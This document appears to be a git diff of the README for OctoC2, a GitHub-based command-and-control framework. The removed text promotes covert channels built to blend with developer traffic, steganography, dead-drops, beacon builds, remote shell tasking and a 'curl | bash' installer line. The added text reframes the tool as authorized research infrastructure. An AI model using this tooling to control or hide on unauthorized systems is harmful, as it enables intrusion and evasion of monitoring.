@@ -5,233 +5,220 @@
 -->
 
 <p align="center">
-  <img src="assets/OctoC2_transparent-Photoroom.png" alt="OctoC2 logo" width="260" />
+  <img src="docs-site/public/logo.png" alt="OctoC2" width="260" />
 </p>
 
 <p align="center">
-  GitHub-native C2. All traffic is HTTPS to <code>api.github.com</code>.<br>
-  No VPS. No custom domains. No listening ports.
+  A GitHub-native, encrypted control plane for authorized systems research.
 </p>
 
-<p align="center">
-  <img src="https://img.shields.io/badge/version-v1.0.0-cyan" alt="v1.0.0"/>
-  <img src="https://img.shields.io/badge/tentacles-11%20live-blue" alt="11 tentacles"/>
-  <img src="https://img.shields.io/badge/license-MIT-blue" alt="MIT License"/>
-</p>
+> [!IMPORTANT]
+> **Authorized use only.** Run OctoC2 only on systems and repositories you own
+> or have explicit permission to test. Use private test infrastructure,
+> least-privilege credentials, trusted TLS, and private listener bindings.
 
-> [!WARNING]
-> **AUTHORIZED USE ONLY**
->
-> For authorized red-team engagements and security research only. Use on systems you own or have explicit written authorization to test.
->
-> Unauthorized use violates the CFAA, the UK Computer Misuse Act, and equivalent laws worldwide. The authors accept zero liability for misuse.
+OctoC2 combines a TypeScript beacon, durable controller, local operator
+dashboard, and CLI. GitHub-backed and direct transports share one signed task
+protocol, one identity model, and the same result-ownership rules.
 
----
+## Start here
 
-## About OctoC2
+| I want to… | Read or run |
+|---|---|
+| Browse all documentation | [Documentation index](docs/README.md) |
+| Understand the system | [Architecture](#architecture) |
+| Set up a local environment | [Local evaluation quickstart](docs/QUICKSTART.md) |
+| Configure listeners and certificates | [Operations and assurance](docs/PRODUCTION.md) |
+| Configure GitHub App recovery | [Recovery guide](docs/RECOVERY.md) |
+| Review implementation and live evidence | [Verification traceability](docs/REMEDIATION_TRACEABILITY.md) |
+| Use the dashboard | [Dashboard guide](dashboard/README.md) |
 
-**OctoC2** is a fully GitHub-native command-and-control framework that turns GitHub itself into your C2 server and exfiltration channel. Every operator command and beacon response travels exclusively through GitHub's public API using legitimate features.
+## Architecture
 
-### Why OctoC2?
+```text
+ Operator CLI / Dashboard
+            │
+            │ authenticated operator API
+            ▼
+ ┌──────────────────────────┐
+ │        Controller        │
+ │ identity · tasks · state │
+ └────────────┬─────────────┘
+              │ signed + encrypted envelopes
+       ┌──────┴─────────┐
+       ▼                ▼
+ GitHub transports   HTTPS / gRPC
+       │                │
+       └──────┬─────────┘
+              ▼
+      Pre-enrolled beacon
+```
 
-- **Zero infrastructure** — No servers, no domains, no open ports
-- **Excellent OPSEC** — Traffic looks like normal developer or CI/CD activity on GitHub
-- **Highly resilient** — 11 covert channels with configurable priority and automatic fallback
-- **Strong encryption** — End-to-end with libsodium `crypto_box` (X25519 + XSalsa20-Poly1305)
-- **Production-ready** — GitHub App auth with rotating 1-hour tokens, encrypted runtime key delivery
-- **One-command setup** — Interactive wizard handles keygen, repo validation, config, and beacon build
+Every transport uses the canonical contracts in `shared/`. The controller
+persists identities, credentials, tasks, results, delivery leases, replay
+records, and channel cursors in SQLite. The beacon persists its Ed25519
+identity and task ledger so a delivered task cannot be executed twice after a
+restart.
 
----
+## Workspaces
 
-## How it works
+| Workspace | Responsibility |
+|---|---|
+| `implant/` | Beacon runtime, task lifecycle, recovery, and transport clients |
+| `server/` | Controller services, durable state, channel polling, HTTP, and gRPC |
+| `dashboard/` | Local operator interface for beacon and task activity |
+| `octoctl/` | Keys, enrollment, builds, task submission, and proxy provisioning |
+| `shared/` | Task catalog, channel catalog, envelopes, identities, and signatures |
+| `proxy/` | Relay workflow build and validation |
+| `docs-site/` | Public documentation site |
 
-Every operator command and beacon response travels through GitHub's own API surface. From a network perspective, the beacon is a Bun process making authenticated HTTPS requests to `api.github.com`. No anomalous outbound connections, no self-signed certs, no beaconing to an IP you own.
+## Transport paths
 
-The beacon picks a channel from a configurable priority list and falls back automatically if a channel goes dark. All payloads are encrypted with libsodium `crypto_box` / `crypto_box_seal`. The operator private key never touches the server or the beacon binary.
+OctoC2 can exchange the same task protocol through several environment-specific
+paths:
 
-For production engagements, swap PATs for GitHub App auth: installation tokens expire hourly and are scoped to a single repository. The App private key is delivered to running beacons at runtime via an encrypted dead-drop — nothing sensitive is baked into the binary.
+- **GitHub artifacts:** Issues, branches, Actions variables, deployments,
+  Gists, repository variables, steganographic PNGs, and Git Notes.
+- **Direct controller paths:** HTTPS/WebSocket, gRPC with mTLS, and GitHub
+  Actions OIDC.
+- **Relayed paths:** a signed two-repository proxy, relay consortium, and
+  Codespaces SSH tunnel.
 
-### Components
+Transport availability depends on its declared GitHub permissions, identity
+material, and network prerequisites. See the [quickstart](docs/QUICKSTART.md)
+for exact credential roles and [traceability record](docs/REMEDIATION_TRACEABILITY.md)
+for test evidence.
 
-| Component   | Path                | Role |
-|-------------|---------------------|------|
-| Implant     | `implant/`          | Bun/TS beacon — 11 channels, automatic fallback, `--smol` memory mode |
-| Server      | `server/`           | Task queue, beacon registry, SSE stream, gRPC endpoint |
-| Dashboard   | `dashboard/`        | Operator UI — real-time beacon feed, task queue, result decryption |
-| CLI         | `octoctl/`          | Setup wizard, service manager, beacon compiler, task queue, shell, results |
-| OctoProxy   | `templates/proxy/`  | Relay through decoy repos via GitHub Actions |
-| Modules     | `modules/`          | Loadable post-ex scripts: recon, screenshot, persist |
+## Quick setup
 
----
+### Requirements
 
-## Covert channels
+- Bun `1.3.14`
+- Node.js `22.14.0` only for tooling that explicitly requires Node
+- GitHub CLI when using Codespaces tunneling
 
-| #  | Channel                  | Transport              | OPSEC notes |
-|----|--------------------------|------------------------|-------------|
-| T1 | Issues + Comments        | Issues API             | Payload in HTML comment; issue title contains no C2 identifiers |
-| T2 | Branch + Files           | Git refs               | Branch named `infra-sync-{id8}`; task in `task.json`, ACK in `ack.json` |
-| T3 | Actions Variables        | Variables API          | `INFRA_*` prefix; works from any environment with a PAT |
-| T4 | Codespaces gRPC          | gRPC over SSH          | Tunnel through Codespace SSH; no external infrastructure |
-| T5 | Pages + Webhooks         | Deployments API        | Deploy environment named `ci-{id8}` |
-| T6 | Gists                    | Gists API              | Secret gist; filenames `svc-*.json` |
-| T7 | Secrets / Variables      | Variables API          | `INFRA_CFG_{id8}` covert ACK; no repo secret touched at runtime |
-| T8 | git notes                | Git refs API           | `refs/notes/svc-*`; invisible in GitHub web UI, no commit history |
-| T9 | Steganography            | Git branches           | LSB alpha-channel PNG; payload in `infra-cache-{id8}` branch |
-| T10| OctoProxy                | Decoy repos            | All traffic relayed through a separate repo you control |
-| T11| HTTP / WebSocket         | WebSocket + REST       | HTTPS to Codespace Dev Tunnel port; falls back to REST polling |
-
-Channel selection is configurable at build time via `--tentacle-priority`. The beacon automatically falls back through the priority list if a channel becomes unavailable.
-
----
-
-## Quick start
-
-**Requirements:** [Bun](https://bun.sh) >= 1.3, a private GitHub repo, a PAT with `repo` scope
+Install the pinned dependency graph and generate the protocol bindings:
 
 ```bash
-# Install Bun (if needed)
-curl -fsSL https://bun.sh/install | bash
-
-# Clone and install
-git clone https://github.com/dstours/OctoC2.git
-cd OctoC2 && bun install
-
-# Run the setup wizard
-cd octoctl && bun run src/index.ts setup
+bun install --frozen-lockfile
+bun run proto:gen
+bun run deps:check
+bun run docs:check
 ```
 
-The wizard walks you through:
-1. GitHub credentials + repo validation
-2. Operator keypair generation
-3. Authentication mode (PAT or GitHub App)
-4. Covert channel selection
-5. Advanced config (proxy repos, Codespace gRPC, sleep tuning)
-6. `.env` file generation
-7. Beacon compilation
-8. Dead-drop creation (App auth)
-9. CLI installation to PATH
-
-After setup:
+Generate the operator encryption keypair:
 
 ```bash
-# Start the C2 server + dashboard
-octoctl start
-
-# Check status
-octoctl status
-
-# List beacons (after deploying the beacon to a target)
-octoctl beacons
-
-# Queue a task
-octoctl task <beaconId> --kind shell --cmd "whoami && id"
-
-# View results
-octoctl results <beaconId> --last 5
-
-# Interactive shell
-octoctl beacon shell --beacon <beaconId>
-
-# Open the dashboard
-# http://localhost:3000
-
-# Stop everything
-octoctl stop
-
-# Pull updates
-octoctl update
+cd octoctl
+bun run src/index.ts keygen
 ```
 
-### Manual setup (alternative)
+Keep the secret key and all repository credentials outside source control.
 
-If you prefer to configure manually instead of using the wizard:
+### Optional local HTTPS listener
 
-1. Generate an operator keypair
-```bash
-bun run octoctl/src/index.ts keygen --set-variable
+Controller listeners remain disabled until explicitly enabled. A minimal
+loopback HTTPS/WSS configuration is:
+
+```text
+OCTOC2_HTTP_ENABLED=true
+OCTOC2_HTTP_HOST=127.0.0.1
+OCTOC2_HTTP_PORT=8080
+OCTOC2_HTTP_SERVER_CERT=/absolute/path/server.crt
+OCTOC2_HTTP_SERVER_KEY=/absolute/path/server.key
+OCTOC2_HTTP_CA_CERT=/absolute/path/ca.crt
+OCTOC2_OPERATOR_API_TOKEN=<unique-operator-token>
+OCTOC2_BEACON_API_TOKENS={"<beacon-id>":"<unique-beacon-token>"}
 ```
 
-2. Create a `.env` file at the project root
-```bash
-OCTOC2_GITHUB_TOKEN=<PAT>
-OCTOC2_REPO_OWNER=<owner>
-OCTOC2_REPO_NAME=<repo>
-OCTOC2_OPERATOR_SECRET=<base64url-secret-from-keygen>
-```
+The certificate SAN must cover the hostname clients use. Install an internal
+CA in each client trust store; there is no certificate-verification bypass.
 
-3. Start and build
-```bash
-octoctl start
-bun run octoctl/src/index.ts build-beacon --outfile ./beacon --target bun-linux-x64
-```
-
-### Build examples
+Start the controller and dashboard in separate terminals:
 
 ```bash
-# Actions channel primary, Issues fallback
-octoctl build-beacon --outfile ./beacon --tentacle-priority actions,issues
-
-# Notes channel (max stealth), Issues fallback
-octoctl build-beacon --outfile ./beacon --tentacle-priority notes,issues
-
-# With GitHub App auth (recommended for production)
-octoctl build-beacon --outfile ./beacon \
-  --app-id <id> --installation-id <id>
-# Then deliver the private key via dead-drop:
-octoctl drop create --beacon <id> --app-key-file <pem>
-
-# Codespaces gRPC with HTTP fallback
-octoctl build-beacon --outfile ./beacon \
-  --codespace-name <name> --github-user <user> \
-  --tentacle-priority codespaces,http,issues
+cd server
+bun run src/index.ts
 ```
-
----
-
-## CLI reference
-
-```
-octoctl setup                          Interactive setup wizard
-octoctl start [server|dashboard]       Start C2 server and/or dashboard
-octoctl stop  [server|dashboard]       Stop running components
-octoctl status                         Show running components + health
-octoctl update                         Pull latest code + reinstall deps
-
-octoctl build-beacon --outfile <path>  Compile beacon with baked credentials
-octoctl beacons                        List registered beacons
-octoctl task <id> --kind <kind>        Queue a task for a beacon
-octoctl results <id>                   View decrypted task results
-octoctl beacon shell --beacon <id>     Interactive shell session
-
-octoctl keygen [--set-variable]        Generate operator X25519 keypair
-octoctl drop create --beacon <id>      Create encrypted dead-drop gist
-octoctl drop list --beacon <id>        Search for existing dead-drops
-octoctl proxy create                   Set up OctoProxy relay repo
-octoctl tentacles list --beacon <id>   Show tentacle channel status
-```
-
----
-
-## Testing
 
 ```bash
-make test   # implant + server + octoctl + dashboard
-
-# E2E (requires env vars from .env)
-bun scripts/test-end-to-end.ts --cleanup
-bun scripts/test-end-to-end.ts --notes --gist --branch --secrets --actions --maintenance --cleanup
+cd dashboard
+bun run dev
 ```
 
-## Documentation
+The dashboard binds to `http://127.0.0.1:5173`.
 
-Full documentation at https://dstours.github.io/OctoC2/
+## Identity and credential boundaries
 
----
+Do not reuse values across these roles:
 
-## License
+| Role | Configuration | Used by |
+|---|---|---|
+| Controller GitHub API | `OCTOC2_SERVER_GITHUB_TOKEN` | Server-side GitHub channels |
+| Operator controller API | `OCTOC2_OPERATOR_API_TOKEN` | Dashboard and CLI REST/SSE calls |
+| Beacon controller API | `OCTOC2_BEACON_API_TOKENS` / `SVC_BEACON_API_TOKEN` | HTTPS and gRPC beacon routes |
+| Operator encryption | `OCTOC2_OPERATOR_SECRET` | Task sealing and result decryption |
+| GitHub App private key | `OCTOC2_GITHUB_APP_PRIVATE_KEY_FILE` | Server-only token minting |
+| Codespaces user access | `SVC_CODESPACES_GITHUB_TOKEN` | Runtime Codespaces API/SSH discovery |
 
-OctoC2 is released under the **MIT License** exclusively for **authorized red teaming, penetration testing, and security research**.
+Direct gRPC additionally requires a trusted CA, a distinct client certificate
+per beacon, and an exact SHA-256 certificate fingerprint binding. Gist uses
+separate controller and beacon credentials for the same dedicated account.
 
-See the full license: [LICENSE](LICENSE)
+## Security model
 
-> **Important**: Unauthorized use on systems you do not own or do not have explicit written permission to test is strictly prohibited and may violate applicable laws (CFAA, Computer Misuse Act, etc.).
+- Network listeners are opt-in and loopback-first.
+- HTTP is TLS-only; gRPC requires mTLS and a per-beacon bearer credential.
+- Beacon identities use provisioned Ed25519 signing keys distinct from X25519
+  encryption keys.
+- Tasks and results are signed, identity-bound, and ownership-checked.
+- Exclusive delivery leases prevent competing transports from claiming one
+  task simultaneously.
+- Durable replay state and the beacon task ledger survive restarts.
+- GitHub App private keys and recovery signing secrets remain server-side.
+- Unsigned remote module execution is rejected across the public surfaces.
+
+Repository permissions are still an operational boundary: a broad repository
+writer may delete, delay, or reorder artifacts even when it cannot forge their
+authenticated contents. Separate repositories and narrowly scoped credentials
+provide stronger isolation.
+
+## Verify a change
+
+Run repository policy checks first:
+
+```bash
+bun run deps:check
+bun run docs:check
+bun run workflows:check
+bun run toolchain:check
+bun run proto:check
+bun run lint
+bun audit
+```
+
+Then run tests and strict type checks in every affected workspace:
+
+```bash
+cd shared && bun test --timeout 30000 && bun run typecheck
+cd ../implant && bun test --timeout 30000 && bun run typecheck
+cd ../server && bun test --timeout 30000 && bun run typecheck
+cd ../dashboard && bun run test && bun run lint && bun run build
+cd ../octoctl && bun test --timeout 30000 && bun run typecheck
+cd ../proxy && bun run typecheck && bun run build
+cd ../docs-site && bun run lint && bun run build
+```
+
+Build beacon targets and smoke-test distributable artifacts:
+
+```bash
+cd implant && bun run build:all
+cd ../server && bun run build
+cd ../octoctl && bun run build
+cd ../proxy && bun run build
+cd .. && bun run smoke:builds
+```
+
+Live qualification is a separate, explicitly authorized exercise. Record the
+revision, environment, credential roles, observed task/result path, and cleanup
+result alongside the test evidence.
